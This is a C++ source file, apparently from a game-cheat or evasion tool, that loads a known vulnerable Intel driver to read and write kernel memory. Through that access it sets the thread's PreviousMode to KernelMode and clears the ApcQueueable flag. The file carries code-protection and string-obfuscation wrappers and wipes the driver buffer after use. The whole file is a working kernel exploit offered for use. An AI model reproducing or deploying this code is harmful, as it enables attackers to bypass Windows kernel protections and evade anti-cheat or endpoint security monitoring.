#include "../general.h"

// KTHREAD -> PreviousMode
const uint64_t OffsetPreviousMode = 0x232;
// KTHREAD -> MiscFlags
const uint64_t OffsetMiscFlags = 0x74;

HANDLE deviceHandle;
volatile uint64_t currentProcess;
volatile uint64_t currentThread;

typedef struct _Flags
{
    union
    {
        struct
        {
            ULONG AutoBoostActive : 1;                                        //0x74
            ULONG ReadyTransition : 1;                                        //0x74
            ULONG WaitNext : 1;                                               //0x74
            ULONG SystemAffinityActive : 1;                                   //0x74
            ULONG Alertable : 1;                                              //0x74
            ULONG UserStackWalkActive : 1;                                    //0x74
            ULONG ApcInterruptRequest : 1;                                    //0x74
            ULONG QuantumEndMigrate : 1;                                      //0x74
            ULONG Spare1 : 1;                                                 //0x74
            ULONG TimerActive : 1;                                            //0x74
            ULONG SystemThread : 1;                                           //0x74
            ULONG ProcessDetachActive : 1;                                    //0x74
            ULONG CalloutActive : 1;                                          //0x74
            ULONG ScbReadyQueue : 1;                                          //0x74
            ULONG ApcQueueable : 1;                                           //0x74
            ULONG ReservedStackInUse : 1;                                     //0x74
            ULONG Spare2 : 1;                                                 //0x74
            ULONG TimerSuspended : 1;                                         //0x74
            ULONG SuspendedWaitMode : 1;                                      //0x74
            ULONG SuspendSchedulerApcWait : 1;                                //0x74
            ULONG CetUserShadowStack : 1;                                     //0x74
            ULONG BypassProcessFreeze : 1;                                    //0x74
            ULONG CetKernelShadowStack : 1;                                   //0x74
            ULONG StateSaveAreaDecoupled : 1;                                 //0x74
            ULONG IsolationWidth : 1;                                         //0x74
            ULONG Reserved : 7;                                               //0x74
        } BitFields;
        LONG MiscFlags;                                                     //0x74
    } Internal;
} Flags;

DWORD WINAPI MagicThread(LPVOID dummy)
{
    ProtectMutate();
	UNREFERENCED_PARAMETER(dummy);

    currentProcess = intel_driver::IoGetCurrentProcess(deviceHandle);
    currentThread = intel_driver::PsGetCurrentThread(deviceHandle);

    memory::Loop();

    ProtectEnd();
	return 0;
}

bool magic::Run()
{
    ProtectUltra();
	console::Info(E("Loading vulnerable driver"));
	deviceHandle = intel_driver::Load();
	if (deviceHandle == INVALID_HANDLE_VALUE)
		return false;

	console::Success(E("Vulnerable driver loaded"));

	console::Info(E("Modifying current process"));
    CreateThread(nullptr, 0, MagicThread, nullptr, 0, nullptr);

    while (!currentThread)
        Sleep(1);

    Sleep(500);

    if (!(currentThread && currentProcess))
    {
        console::Error(E("Failed to get current process and thread"));
        goto exit;
    }

    console::Debug(E("EPROCESS: 0x%p"), currentProcess);
    console::Debug(E("ETHREAD: 0x%p"), currentThread);

    bool status = false;

    char mode = 0; // KernelMode
    if (!intel_driver::WriteMemory(deviceHandle, currentThread + OffsetPreviousMode, &mode, sizeof(char)))
    {
        console::Error(E("Failed to write kernel structures"));
        goto exit;
    }

    Flags flags;
    if (!intel_driver::ReadMemory(deviceHandle, currentThread + OffsetMiscFlags, &flags, sizeof(Flags)))
    {
        console::Error(E("Failed to read kernel structures"));
        goto exit;
    }

    flags.Internal.BitFields.ApcQueueable = false;

    if (!intel_driver::WriteMemory(deviceHandle, currentThread + OffsetMiscFlags, &flags, sizeof(Flags)))
    {
        console::Error(E("Failed to write kernel structures"));
        goto exit;
    }

    status = true;
    console::Success(E("Modification successful"));

exit:
    console::Info(E("Unloading vulnerable driver"));
    if (!intel_driver::Unload(deviceHandle))
    {
        console::Error(E("Failed to unload vulnerable driver"));
        return false;
    }

    console::Success(E("Vulnerable driver unloaded"));

    console::Info(E("Cleaning driver buffer"));
    memset(driver_resource::driverBuffer, 0, sizeof(driver_resource::driverBuffer));
    console::Success(E("Driver buffer cleaned"));
    ProtectEnd();
    return status;
}
